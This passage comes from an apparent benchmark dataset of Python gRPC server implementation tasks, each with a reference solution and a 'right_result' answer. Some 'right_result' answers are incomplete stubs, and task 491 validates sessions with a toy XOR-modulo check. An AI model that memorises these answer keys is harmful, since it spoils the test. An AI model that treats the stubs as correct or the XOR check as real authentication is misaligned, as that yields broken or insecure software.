    "Instruction": "Task Description: Implement a gRPC server in Python that handles model inference requests, supports both single and streaming responses, and provides graceful termination capabilities.\n\nClass Description: ModelResponse is a gRPC servicer class that implements model inference services. It manages request processing, response generation, and server lifecycle events.\n\nAttributes:\n- _stop_event: [threading.Event] - Event flag for server termination control\n- inference_pipeline: [AsyncPipeline] - Pipeline for handling asynchronous inference requests\n- method_name_to_task: [Dict[str, str]] - Mapping between gRPC method names and task types\n- lock: [threading.Lock] - Thread synchronization primitive for concurrent access control\n\nMethods:\n- __init__: [Name](async_pipeline: AsyncPipeline = None) -> None - Initializes the servicer with an optional async pipeline\n- Terminate: [Name](request: google.protobuf.Empty, context: grpc.ServicerContext) -> google.protobuf.Empty - Signals server to stop processing new requests\n- get_stop_event: [Name]() -> threading.Event - Returns the stop event for server control\n- GeneratorReply: [Name](request: ModelRequest, context: grpc.ServicerContext) -> ModelResponse - Handles batch inference requests and returns a single response\n- GeneratorReplyStream: [Name](request: ModelRequest, context: grpc.ServicerContext) -> Iterator[ModelResponse] - Handles streaming inference requests and yields multiple responses\n- _get_task_methods: [Name](method_name: str) -> Dict[str, TaskMethods] - Retrieves task-specific methods for request processing\n\nFunction Description: _do_serve sets up and runs the gRPC server with specified configuration and service implementation.\n\nInput:\n- service_impl: [ModelResponse] - The service implementation instance\n- port: [int] - Port number for server binding\n- interceptors: [List[grpc.ServerInterceptor]] - Optional list of gRPC interceptors\n\nOutput: None (runs the server until termination signal is received)",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom typing import Dict\nimport threading\nfrom google.protobuf import empty_pb2 as google_dot_protobuf_dot_empty__pb2\nfrom mii.grpc_related.proto import modelresponse_pb2_grpc\nfrom mii.constants import LB_MAX_WORKER_THREADS, GRPC_MAX_MSG_SIZE, SERVER_SHUTDOWN_TIMEOUT\n\nclass ModelResponse(modelresponse_pb2_grpc.ModelResponseServicer):\n    def __init__(self, async_pipeline=None):\n        self._stop_event = threading.Event()\n        self.inference_pipeline = async_pipeline\n        self.method_name_to_task = {m.method: t for t, m in TASK_METHODS_DICT.items()}\n        self.lock = threading.Lock()\n\n    def Terminate(self, request, context):\n        self._stop_event.set()\n        return google_dot_protobuf_dot_empty__pb2.Empty()\n\n    def get_stop_event(self):\n        return self._stop_event\n\n    def GeneratorReply(self, request, context):\n        task_methods = self._get_task_methods(\"GeneratorReply\")\n        prompts, kwargs = task_methods.unpack_request_from_proto(request)\n        uids_put_order, uids_running, uids_complete_order, responses = [], [], [], []\n\n        try:\n            for p in prompts:\n                request_kwargs = kwargs.copy()\n                uid = self.inference_pipeline.put_request(p, request_kwargs)\n                uids_put_order.append(uid)\n                uids_running.append(uid)\n\n            while uids_running:\n                uid, response = self.inference_pipeline.get_response()\n                if uid == -1:\n                    uid = uids_running[0]\n                responses.append(response)\n                self.inference_pipeline.flush_uid(uid)\n                uids_complete_order.append(uids_put_order.index(uid))\n                uids_running.remove(uid)\n\n            responses = [\n                r for idx,\n                r in sorted(zip(uids_complete_order,\n                                responses),\n                            key=lambda pair: pair[0])\n            ]\n            return task_methods.pack_response_to_proto(responses)\n        finally:\n            [self.inference_pipeline.flush_uid(uid) for uid in uids_running]\n\n    def GeneratorReplyStream(self, request, context):\n        task_methods = self._get_task_methods(\"GeneratorReply\")\n        prompts, kwargs = task_methods.unpack_request_from_proto(request)\n        uid = self.inference_pipeline.put_request(prompts[0], kwargs)\n\n        while True:\n            response_uid, r = self.inference_pipeline.get_response()\n            assert uid == response_uid, \"uid mismatch\"\n            done = r.finish_reason != GenerationFinishReason.NONE\n            response = task_methods.pack_response_to_proto([r])\n            yield response\n            if done:\n                break\n\n        self.inference_pipeline.flush_uid(uid)\n\n    def _get_task_methods(self, method_name: str) -> Dict[str, TaskMethods]:\n        if method_name not in self.method_name_to_task:\n            raise ValueError(f\"unknown method: {method_name}\")\n\n        task = self.method_name_to_task[method_name]\n        if task not in TASK_METHODS_DICT:\n            raise ValueError(f\"unknown task: {task}\")\n\n        return TASK_METHODS_DICT[task]\n\ndef _do_serve(service_impl, port, interceptors=[]):\n    stop_event = service_impl.get_stop_event()\n    server = grpc.server(\n        futures.ThreadPoolExecutor(max_workers=LB_MAX_WORKER_THREADS),\n        interceptors=interceptors,\n        options=[\n            (\"grpc.max_send_message_length\", GRPC_MAX_MSG_SIZE),\n            (\"grpc.max_receive_message_length\", GRPC_MAX_MSG_SIZE)\n        ]\n    )\n    modelresponse_pb2_grpc.add_ModelResponseServicer_to_server(service_impl, server)\n    server.add_insecure_port(f\"[::]:{port}\")\n    server.start()\n    stop_event.wait()\n    server.stop(SERVER_SHUTDOWN_TIMEOUT)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent.futures import ThreadPoolExecutor\nfrom threading import Event, Lock\nfrom typing import Dict, Iterator, Optional, List\nfrom google.protobuf.empty_pb2 import Empty\nfrom your_proto_module import ModelRequest, ModelResponse, add_ModelServiceServicer_to_server\n\nclass TaskMethods:\n    pass\n\nclass ModelResponse:\n    def __init__(self, async_pipeline=None) -> None:\n        self._stop_event = Event()\n        self.inference_pipeline = async_pipeline\n        self.method_name_to_task: Dict[str, str] = {}\n        self.lock = Lock()\n\n    def Terminate(self, request: Empty, context: grpc.ServicerContext) -> Empty:\n        self._stop_event.set()\n        return Empty()\n\n    def get_stop_event(self) -> Event:\n        return self._stop_event\n\n    def GeneratorReply(self, request: ModelRequest, context: grpc.ServicerContext) -> ModelResponse:\n        pass\n\n    def GeneratorReplyStream(self, request: ModelRequest, context: grpc.ServicerContext) -> Iterator[ModelResponse]:\n        pass\n\n    def _get_task_methods(self, method_name: str) -> Dict[str, TaskMethods]:\n        pass\n\ndef _do_serve(service_impl: ModelResponse, port: int, interceptors: Optional[List[grpc.ServerInterceptor]] = None) -> None:\n    server = grpc.server(\n        ThreadPoolExecutor(),\n        interceptors=interceptors\n    )\n    add_ModelServiceServicer_to_server(service_impl, server)\n    server.add_insecure_port(f'[::]:{port}')\n    server.start()\n    service_impl.get_stop_event().wait()\n    server.stop(grace=5)"
  },
  {
    "Task_id": 490,
    "Instruction": "Task Description: Create a gRPC server implementation in Python that supports multiple protocols, including health checks and service reflection, using asynchronous gRPC.\n\nClass Description: MultiProtocolGateway is a class that sets up and manages a gRPC server with support for JinaRPC protocol, health checks, and server reflection. It handles server initialization, startup, and graceful shutdown.\n\nAttributes:\n- grpc_port: int - The port number on which the gRPC server will listen\n- host: str - The host address to bind the server to (default: '0.0.0.0')\n- health_servicer: grpc_health.v1.health.HealthServicer - Handles health check requests\n- grpc_server: grpc.aio.Server - The asynchronous gRPC server instance\n\nMethods:\n- __init__(grpc_port: int, host: str = '0.0.0.0') -> None - Initializes the gateway with specified port and host\n- _setup_grpc_server() -> None - Asynchronously configures and starts the gRPC server with required services\n- run_server() -> None - Asynchronously runs the server until termination\n- shutdown() -> None - Asynchronously shuts down the server gracefully",
    "Canonical_solution": "import grpc\nfrom grpc_health.v1 import health, health_pb2, health_pb2_grpc\nfrom grpc_reflection.v1alpha import reflection\nfrom jina.proto import jina_pb2, jina_pb2_grpc\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int, host: str = '0.0.0.0'):\n        self.grpc_port = grpc_port\n        self.host = host\n        self.health_servicer = health.HealthServicer(experimental_non_blocking=True)\n        self.grpc_server = None\n\n    async def _setup_grpc_server(self):\n        self.grpc_server = grpc.aio.server()\n\n        jina_pb2_grpc.add_JinaRPCServicer_to_server(\n            self.streamer._streamer, self.grpc_server\n        )\n\n        service_names = (\n            jina_pb2.DESCRIPTOR.services_by_name['JinaRPC'].full_name,\n            reflection.SERVICE_NAME,\n        )\n        \n        health_pb2_grpc.add_HealthServicer_to_server(\n            self.health_servicer, self.grpc_server\n        )\n        \n        for service in service_names:\n            self.health_servicer.set(service, health_pb2.HealthCheckResponse.SERVING)\n            \n        reflection.enable_server_reflection(service_names, self.grpc_server)\n        self.grpc_server.add_insecure_port(f'{self.host}:{self.grpc_port}')\n        await self.grpc_server.start()\n\n    async def run_server(self):\n        await self._setup_grpc_server()\n        await self.grpc_server.wait_for_termination()\n\n    async def shutdown(self):\n        await self.grpc_server.stop(0)\n        self.health_servicer.enter_graceful_shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import asyncio\nimport grpc\nfrom grpc_health.v1 import health, health_pb2_grpc\nfrom jina import __version__\nfrom jina.excepts import BadServer\nfrom jina.logging.logger import JinaLogger\nfrom jina.proto import jina_pb2_grpc\n\nclass MultiProtocolGateway:\n    def __init__(self, grpc_port: int, host: str = '0.0.0.0'):\n        self.grpc_port = grpc_port\n        self.host = host\n        self.health_servicer = health.HealthServicer()\n        self.grpc_server = None\n        self.logger = JinaLogger(self.__class__.__name__)\n\n    async def _setup_grpc_server(self):\n        self.grpc_server = grpc.aio.server()\n        jina_pb2_grpc.add_JinaRPCServicer_to_server(JinaRPCHTTPGateway(), self.grpc_server)\n        health_pb2_grpc.add_HealthServicer_to_server(self.health_servicer, self.grpc_server)\n        service_names = (\n            jina_pb2_grpc.DESCRIPTOR.services_by_package['jina'].full_name,\n            health_pb2_grpc.DESCRIPTOR.services_by_package['grpc.health.v1'].full_name,\n            'gRPC.Reflection.v1alpha.ServerReflection',\n        )\n        grpc_reflection.enable_server_reflection(service_names, self.grpc_server)\n        listen_addr = f'{self.host}:{self.grpc_port}'\n        if not self.grpc_server.add_insecure_port(listen_addr):\n            raise BadServer(f'Can not bind to port {self.grpc_port}, it is already in use!')\n        await self.grpc_server.start()\n        self.logger.info(f'Server listening on {listen_addr}')\n\n    async def run_server(self):\n        await self._setup_grpc_server()\n        await self.grpc_server.wait_for_termination()\n\n    async def shutdown(self):\n        await self.grpc_server.stop(5)"
  },
  {
    "Task_id": 491,
    "Instruction": "Task Description: Implement a gRPC server in Python that provides session validation functionality using the grpcio library. The server should handle concurrent requests and validate sessions based on a specific mathematical operation between user_id and session_id.\n\nClass Description: ValidateServiceService is a gRPC service implementation that validates user sessions. It inherits from the generated LoginServiceServicer class and provides methods for session validation and server management.\n\nAttributes:\n- None explicitly defined (inherits attributes from parent class)\n\nMethods:\n- Validate(request, context) -> pb2.ValidateResponse: Validates a user session by performing a mathematical operation (XOR followed by modulo 23) on the user_id and session_id from the request. Returns a ValidateResponse with a boolean result.\n  Input: \n    - request: pb2.ValidateRequest - Contains user_id and session_id to validate\n    - context: grpc.ServicerContext - gRPC context object\n  Output: pb2.ValidateResponse - Contains validation result (True/False)\n\n- serve(port, max_workers) -> None: Starts and runs the gRPC server on the specified port with the given number of worker threads.\n  Input:\n    - port: str (default='50051') - Port number to bind the server to\n    - max_workers: int (default=10) - Maximum number of worker threads\n  Output: None (runs indefinitely until terminated)",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nimport validate_session_pb2_grpc as pb2_grpc\nimport validate_session_pb2 as pb2\n\nclass ValidateServiceService(pb2_grpc.LoginServiceServicer):\n    def __init__(self, *args, **kwargs):\n        pass\n\n    def Validate(self, request, context):\n        return pb2.ValidateResponse(result=((request.user_id ^ request.session_id) % 23 == 0))\n\n    def serve(self, port='50051', max_workers=10):\n        server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        pb2_grpc.add_LoginServiceServicer_to_server(self, server)\n        server.add_insecure_port(f'[::]:{port}')\n        server.start()\n        server.wait_for_termination()",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport pb2\nimport pb2_grpc\n\nclass ValidateServiceService(pb2_grpc.LoginServiceServicer):\n    def Validate(self, request, context):\n        result = (request.user_id ^ request.session_id) % 23 == 0\n        return pb2.ValidateResponse(result=result)\n\n    def serve(self, port='50051', max_workers=10):\n        server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        pb2_grpc.add_LoginServiceServicer_to_server(self, server)\n        server.add_insecure_port(f'[::]:{port}')\n        server.start()\n        server.wait_for_termination()"
  },
  {
    "Task_id": 492,
    "Instruction": "Task Description: Implement a gRPC server in Python that handles various model inference requests concurrently, with thread-safe operations and graceful shutdown capabilities.\n\nClass Description: The GRPCServer class encapsulates a gRPC server implementation that manages multiple model inference services. It provides concurrent request handling, message size configuration, and proper shutdown mechanisms.\n\nAttributes:\n- server: [grpc.Server] - The gRPC server instance that handles incoming requests\n- stop_event: [threading.Event] - Event flag used to signal server termination\n\nMethods:\n- __init__: [Name](service_impl: [ModelResponseServicer], port: [int]) -> [None] - Initializes the gRPC server with thread pool executor, message size limits, and binds it to the specified port\n- start: [Name]() -> [None] - Starts the server and waits for termination signal before shutting down gracefully\n\nClass Description: The ModelResponseServicer class implements the actual gRPC service methods for various model inference tasks, providing thread-safe operation through locking mechanisms.\n\nAttributes:\n- _stop_event: [threading.Event] - Event flag used to signal service termination\n- inference_pipeline: [object] - The underlying inference processing pipeline\n- lock: [threading.Lock] - Lock for thread-safe operations\n\nMethods:\n- __init__: [Name](inference_pipeline: [object]) -> [None] - Initializes the servicer with inference pipeline and synchronization primitives\n- Terminate: [Name](request: [google.protobuf.Empty], context: [grpc.ServicerContext]) -> [google.protobuf.Empty] - Signals the server to terminate\n- get_stop_event: [Name]() -> [threading.Event] - Returns the stop event for server control\n- _run_inference: [Name](method_name: [str], request_proto: [object]) -> [object] - Internal thread-safe method for processing inference requests\n- GeneratorReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles generator model requests\n- Txt2ImgReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles text-to-image model requests\n- ClassificationReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles classification model requests\n- QuestionAndAnswerReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles Q&A model requests\n- FillMaskReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles fill-mask model requests\n- TokenClassificationReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles token classification requests\n- ZeroShotImgClassificationReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles zero-shot image classification\n- InpaintingReply: [Name](request: [object], context: [grpc.ServicerContext]) -> [object] - Handles image inpainting requests",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom google.protobuf import empty_pb2 as google_dot_protobuf_dot_empty__pb2\nfrom .proto import legacymodelresponse_pb2_grpc as modelresponse_pb2_grpc\nimport threading\nfrom mii.legacy.constants import (\n    GRPC_MAX_MSG_SIZE,\n    LB_MAX_WORKER_THREADS,\n    SERVER_SHUTDOWN_TIMEOUT\n)\n\nclass ModelResponseServicer(modelresponse_pb2_grpc.ModelResponseServicer):\n    def __init__(self, inference_pipeline):\n        self._stop_event = threading.Event()\n        self.inference_pipeline = inference_pipeline\n        self.lock = threading.Lock()\n\n    def Terminate(self, request, context):\n        self._stop_event.set()\n        return google_dot_protobuf_dot_empty__pb2.Empty()\n\n    def get_stop_event(self):\n        return self._stop_event\n\n    def _run_inference(self, method_name, request_proto):\n        with self.lock:\n            response = self.inference_pipeline.process_request(method_name, request_proto)\n        return response\n\n    def GeneratorReply(self, request, context):\n        return self._run_inference(\"GeneratorReply\", request)\n\n    def Txt2ImgReply(self, request, context):\n        return self._run_inference(\"Txt2ImgReply\", request)\n\n    def ClassificationReply(self, request, context):\n        return self._run_inference(\"ClassificationReply\", request)\n\n    def QuestionAndAnswerReply(self, request, context):\n        return self._run_inference(\"QuestionAndAnswerReply\", request)\n\n    def FillMaskReply(self, request, context):\n        return self._run_inference(\"FillMaskReply\", request)\n\n    def TokenClassificationReply(self, request, context):\n        return self._run_inference(\"TokenClassificationReply\", request)\n\n    def ZeroShotImgClassificationReply(self, request, context):\n        return self._run_inference(\"ZeroShotImgClassificationReply\", request)\n\n    def InpaintingReply(self, request, context):\n        return self._run_inference(\"InpaintingReply\", request)\n\nclass GRPCServer:\n    def __init__(self, service_impl, port):\n        self.server = grpc.server(\n            futures.ThreadPoolExecutor(max_workers=LB_MAX_WORKER_THREADS),\n            options=[\n                (\"grpc.max_send_message_length\", GRPC_MAX_MSG_SIZE),\n                (\"grpc.max_receive_message_length\", GRPC_MAX_MSG_SIZE),\n            ]\n        )\n        modelresponse_pb2_grpc.add_ModelResponseServicer_to_server(service_impl, self.server)\n        self.server.add_insecure_port(f\"[::]:{port}\")\n        self.stop_event = service_impl.get_stop_event()\n\n    def start(self):\n        self.server.start()\n        self.stop_event.wait()\n        self.server.stop(SERVER_SHUTDOWN_TIMEOUT)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport threading\nimport model_inference_pb2\nimport model_inference_pb2_grpc\n\nclass GRPCServer:\n    def __init__(self, service_impl: model_inference_pb2_grpc.ModelResponseServicer, port: int):\n        self.stop_event = threading.Event()\n        options = [\n            ('grpc.max_send_message_length', 50 * 1024 * 1024),\n            ('grpc.max_receive_message_length', 50 * 1024 * 1024)\n        ]\n        self.server = grpc.server(\n            futures.ThreadPoolExecutor(max_workers=10),\n            options=options\n        )\n        model_inference_pb2_grpc.add_ModelResponseServicer_to_server(service_impl, self.server)\n        self.server.add_insecure_port(f'[::]:{port}')\n    \n    def start(self):\n        self.server.start()\n        try:\n            while not self.stop_event.is_set():\n                self.stop_event.wait(1)\n        except KeyboardInterrupt:\n            pass\n        finally:\n            self.server.stop(grace=5)\n\nclass ModelResponseServicer(model_inference_pb2_grpc.ModelResponseServicer):\n    def __init__(self, inference_pipeline: object):\n        self._stop_event = threading.Event()\n        self.inference_pipeline = inference_pipeline\n        self.lock = threading.Lock()\n    \n    def Terminate(self, request: model_inference_pb2.Empty, context: grpc.ServicerContext) -> model_inference_pb2.Empty:\n        self._stop_event.set()\n        return model_inference_pb2.Empty()\n    \n    def get_stop_event(self) -> threading.Event:\n        return self._stop_event\n    \n    def _run_inference(self, method_name: str, request_proto: model_inference_pb2.InferenceRequest):\n        with self.lock:\n            if self._stop_event.is_set():\n                raise RuntimeError(\"Service is shutting down\")\n            try:\n                method = getattr(self.inference_pipeline, method_name)\n                result = method(request_proto)\n                return result\n            except Exception as e:\n                raise RuntimeError(f\"Inference error: {str(e)}\")\n    \n    def GeneratorReply(self, request: model_inference_pb2.GeneratorRequest, context: grpc.ServicerContext):\n        try:\n            response = self._run_inference(\"generate\", request)\n            return response\n        except Exception as e:\n            context.set_code(grpc.StatusCode.INTERNAL)\n            context.set_details(str(e))\n            return model_inference_pb2.InferenceResponse()\n    \n    def Txt2ImgReply(self, request: model_inference_pb2.Txt2ImgRequest, context: grpc.ServicerContext):\n        try:\n            response = self._run_inference(\"txt2img\", request)\n            return response\n        except Exception as e:\n            context.set_code(grpc.StatusCode.INTERNAL)\n            context.set_details(str(e))\n            return model_inference_pb2.ImageResponse()\n    \n    def ClassificationReply(self, request: model_inference_pb2.ClassificationRequest, context: grpc.ServicerContext):\n        try:\n            response = self._run_inference(\"classify\", request)\n            return response\n        except Exception as e:\n            context.set_code(grpc.StatusCode.INTERNAL)\n            context.set_details(str(e))\n            return model_inference_pb2.ClassificationResponse()\n    \n    def QuestionAndAnswerReply(self, request: model_inference_pb2.QuestionAnswerRequest, context: grpc.ServicerContext):\n        try:\n            response = self._run_inference(\"qa\", request)\n            return response\n        except Exception as e:\n            context.set_code(grpc.StatusCode.INTERNAL)\n            context.set_details(str(e))\n            return model_inference_pb2.AnswerResponse()\n    \n    def FillMaskReply(self, request: model_inference_pb2.FillMaskRequest, context: grpc.ServicerContext):\n        try:\n            response = self._run_inference(\"fill_mask\", request)\n            return response\n        except Exception as e:\n            context.set_code(grpc.StatusCode.INTERNAL)\n            context.set_details(str(e))\n            return model_inference_pb2.FillMaskResponse()\n    \n    def TokenClassificationReply(self, request: model_inference_pb2.TokenClassificationRequest, context: grpc.ServicerContext):\n        try:\n            response = self._run_inference(\"token_classify\", request)\n            return response\n        except Exception as e:\n            context.set_code(grpc.StatusCode.INTERNAL)\n            context.set_details(str(e))\n            return model_inference_pb2.TokenClassificationResponse()\n    \n    def ZeroShotImgClassificationReply(self, request: model_inference_pb2.ZeroShotImgClassificationRequest, context: grpc.ServicerContext):\n        try:\n            response = self._run_inference(\"zero_shot_classify\", request)\n            return response\n        except Exception as e:\n            context.set_code(grpc.StatusCode.INTERNAL)\n            context.set_details(str(e))\n            return model_inference_pb2.ZeroShotImgClassificationResponse()\n    \n    def InpaintingReply(self, request: model_inference_pb2.InpaintingRequest, context: grpc.ServicerContext):\n        try:\n            response = self._run_inference(\"inpaint\", request)\n            return response\n        except Exception as e:\n            context.set_code(grpc.StatusCode.INTERNAL)\n            context.set_details(str(e))\n            return model_inference_pb2.InpaintingResponse()"
  },
  {
    "Task_id": 494,
    "Instruction": "Task Description: Implement a gRPC server class in Python that can handle concurrent requests and manage the server lifecycle (start, run, wait, and stop).\n\nClass Description: The GRPCServer class is responsible for creating and managing a gRPC server instance. It initializes the server with a thread pool executor for handling concurrent requests, binds the server to a specified host and port, and provides methods to start, run, wait for termination, and stop the server.\n\nAttributes:\n- _server: grpc.Server - The gRPC server instance that handles incoming requests.\n\nMethods:\n- __init__(api_service: 'APIService', max_workers: int = 20) -> None - Initializes the gRPC server with a thread pool executor and binds the API service implementation to the server.\n- start(host: str, port: int) -> None - Starts the gRPC server by binding it to the specified host and port.\n- run(host: str, port: int) -> None - Combines the start and wait methods to run the server indefinitely.\n- wait() -> None - Blocks the current thread until the server is terminated.\n- stop() -> None - Stops the gRPC server gracefully.",
    "Canonical_solution": "import typing as T\nimport inspect\nimport traceback\nfrom concurrent import futures\nimport grpc\nfrom towhee.serve.io import JSON, TEXT, BYTES, NDARRAY\nfrom towhee.serve.api_service import RouterConfig\nfrom towhee.utils.log import engine_log\n\nclass GRPCServer:\n    def __init__(self, api_service: 'APIService', max_workers: int = 20):\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        service_pb2_grpc.add_PipelineServicesServicer_to_server(_PipelineImpl(api_service), self._server)\n\n    def start(self, host: str, port: int):\n        uri = str(host) + ':' + str(port)\n        self._server.add_insecure_port(uri)\n        self._server.start()\n        engine_log.info('Start grpc server at %s.', uri)\n\n    def run(self, host: str, port: int):\n        self.start(host, port)\n        self.wait()\n\n    def wait(self):\n        self._server.wait_for_termination()\n\n    def stop(self):\n        self._server.stop(None)",
    "Code_level": "Class-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nfrom typing import Optional\n\nclass GRPCServer:\n    def __init__(self, api_service: 'APIService', max_workers: int = 20) -> None:\n        self._server = grpc.server(futures.ThreadPoolExecutor(max_workers=max_workers))\n        api_service.bind_to_server(self._server)\n\n    def start(self, host: str, port: int) -> None:\n        address = f\"{host}:{port}\"\n        self._server.add_insecure_port(address)\n        self._server.start()\n\n    def run(self, host: str, port: int) -> None:\n        self.start(host, port)\n        self.wait()\n\n    def wait(self) -> None:\n        self._server.wait_for_termination()\n\n    def stop(self) -> None:\n        self._server.stop(grace=None)"
  },
  {
    "Task_id": 495,
    "Instruction": "Task Description: Create a function to set up and tear down a gRPC server with configurable interceptors and thread pool workers.\n\nFunction Description: The function `_set_up` initializes and starts a gRPC server with optional interceptors, while `_tear_down` gracefully stops the server. The server is configured to handle gRPC requests concurrently using a thread pool.\n\nInput:\n- `interceptors` (Optional[List[grpc.ServerInterceptor]]): A list of gRPC server interceptors for request/response processing. Defaults to None.\n- `server` (grpc.Server): The gRPC server instance to be stopped (for `_tear_down`).\n\nOutput:\n- `_set_up` returns the initialized and started `grpc.Server` instance.\n- `_tear_down` has no return value (stops the server).",
    "Canonical_solution": "import grpc\nfrom concurrent import futures\nfrom typing import List, Optional\n\ndef _set_up(interceptors: Optional[List[grpc.ServerInterceptor]] = None):\n    server = grpc.server(\n        futures.ThreadPoolExecutor(max_workers=2),\n        interceptors=interceptors,\n    )\n    add_gRPCTestServiceServicer_to_server(TestService(), server)\n    server.add_insecure_port(\"[::]:{}\".format(PORT))\n    server.start()\n    return server\n\ndef _tear_down(server: grpc.Server):\n    server.stop(None)",
    "Code_level": "Function-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent.futures import ThreadPoolExecutor\nfrom typing import Optional, List\n\ndef _set_up(interceptors: Optional[List[grpc.ServerInterceptor]] = None) -> grpc.Server:\n    thread_pool = ThreadPoolExecutor(max_workers=10)\n    server = grpc.server(thread_pool, interceptors=interceptors)\n    server.add_insecure_port('[::]:50051')\n    server.start()\n    return server\n\ndef _tear_down(server: grpc.Server) -> None:\n    server.stop(grace=None)"
  },
  {
    "Task_id": 496,
    "Instruction": "Task Description: Create a gRPC server in Python that can handle multiple versions of a service concurrently, with support for server reflection and interceptors.\n\nFunction Description: The `serve()` function initializes and starts two gRPC servers on different ports. The first server handles versions 1 and 2 of the Greeter service, while the second server handles version 3 with reflection enabled. Both servers use thread pool executors for concurrency and share the same interceptors for request logging.\n\nInput: None (The function takes no parameters)\n\nOutput: None (The function doesn't return anything but starts servers that run indefinitely)\n\nNote: The function uses threading.Event().wait() to keep the servers running indefinitely. The servers are configured with:\n1. ThreadPoolExecutor with 10 workers for concurrent request handling\n2. LoggingInterceptor for request logging\n3. Insecure ports (50051 and 50052) for communication\n4. Different service versions (v1, v2 on port 50051; v3 with reflection on port 50052)",
    "Canonical_solution": "import logging\nimport threading\nfrom concurrent import futures\nimport grpc\nimport helloworld_v1_precompiled_pb2_grpc as helloworld_pb2_grpc_v1\nimport helloworld_v2_compiled_pb2_grpc as helloworld_pb2_grpc_v2\nimport helloworld_v3_reflected_pb2_grpc as helloworld_pb2_grpc_v3\nfrom grpc_interceptor import ServerInterceptor\nfrom grpc_reflection.v1alpha import reflection\n\ndef serve():\n    interceptors = [LoggingInterceptor()]\n    executor = futures.ThreadPoolExecutor(max_workers=10)\n\n    # One server which exposes these two\n    server = grpc.server(\n        executor,\n        interceptors=interceptors,\n    )\n    helloworld_pb2_grpc_v1.add_GreeterServicer_to_server(GreeterV1(), server)\n    helloworld_pb2_grpc_v2.add_GreeterServicer_to_server(GreeterV2(), server)\n\n    server.add_insecure_port(\"0.0.0.0:50051\")\n    server.start()\n\n    # One server which exposes the V3 API and has reflection turned on\n    reflecting_server = grpc.server(\n        executor,\n        interceptors=interceptors,\n    )\n    helloworld_pb2_grpc_v3.add_GreeterServicer_to_server(GreeterV3(), reflecting_server)\n    service_names = (\n        helloworld_pb2_v3.DESCRIPTOR.services_by_name[\"Greeter\"].full_name,\n        reflection.SERVICE_NAME,\n    )\n    reflection.enable_server_reflection(service_names, reflecting_server)\n    reflecting_server.add_insecure_port(\"0.0.0.0:50052\")\n    reflecting_server.start()\n\n    logging.info(\"Starting grpc server\")\n    event = threading.Event()\n    event.wait()",
    "Code_level": "Function-level",
    "FSMID_for_test": 74,
    "right_result": "import grpc\nfrom concurrent import futures\nimport threading\nimport logging\nimport greeter_pb2_grpc_v1 as v1\nimport greeter_pb2_grpc_v2 as v2\nimport greeter_pb2_grpc_v3 as v3\nfrom grpc_reflection.v1alpha import reflection\n\nclass LoggingInterceptor(grpc.ServerInterceptor):\n    def intercept_service(self, continuation, handler_call_details):\n        logging.info(f\"Request received: {handler_call_details.method}\")\n        return continuation(handler_call_details)\n\ndef serve():\n    interceptor = LoggingInterceptor()\n    options = [('grpc.max_send_message_length', 1024*1024*5), ('grpc.max_receive_message_length', 1024*1024*5)]\n\n    def add_services_v1_v2(server):\n        v1.add_GreeterServicer_to_server(GreeterV1(), server)\n        v2.add_GreeterServicer_to_server(GreeterV2(), server)\n\n    def add_services_v3(server):\n        v3.add_GreeterServicer_to_server(GreeterV3(), server)\n        SERVICE_NAMES = (\n            v3.DESCRIPTOR.services_by_name['Greeter'].full_name,\n            reflection.SERVICE_NAME,\n        )\n        reflection.enable_server_reflection(SERVICE_NAMES, server)\n\n    server1 = grpc.server(futures.ThreadPoolExecutor(max_workers=10), interceptors=(interceptor,), options=options)\n    add_services_v1_v2(server1)\n    server1.add_insecure_port('[::]:50051')\n    server1.start()\n    \n    server2 = grpc.server(futures.ThreadPoolExecutor(max_workers=10), interceptors=(interceptor,), options=options)\n    add_services_v3(server2)\n    server2.add_insecure_port('[::]:50052')\n    server2.start()\n\n    event = threading.Event()\n    event.wait()"
  },
  {
    "Task_id": 497,
    "Instruction": "Task Description: Create a gRPC server in Python that handles incoming requests using a thread pool for concurrency, implements service methods, and supports server reflection.\n\nClass Description: GRPCServer is a class that encapsulates the functionality of a gRPC server, including initialization with a thread pool, service implementation, and server lifecycle management (start/stop).\n\nAttributes:\n- _server: grpc.Server - The underlying gRPC server instance\n- _service_impl: ServiceImpl - The implementation of the gRPC service methods\n\nMethods:\n- __init__(max_workers: int = 5) -> None - Initializes the gRPC server with a thread pool executor of specified size and sets up service implementation\n- start(port: int) -> None - Binds the server to the specified port and starts listening for incoming requests\n- stop(grace_period: float = 1.0) -> None - Stops the server with the specified grace period for ongoing requests\n\nNested Class Description: ServiceImpl implements the actual gRPC service methods defined in the protobuf service.\n\nMethods:\n- Empty(request: Any, context) -> Any - Handles empty requests and returns an empty response\n- SimpleTest(request: test_services_pb2.DummyRequest, context: grpc.ServicerContext) -> test_services_pb2.DummyResponse - Processes a dummy request, validates input, and returns a response or aborts with error if validation fails",
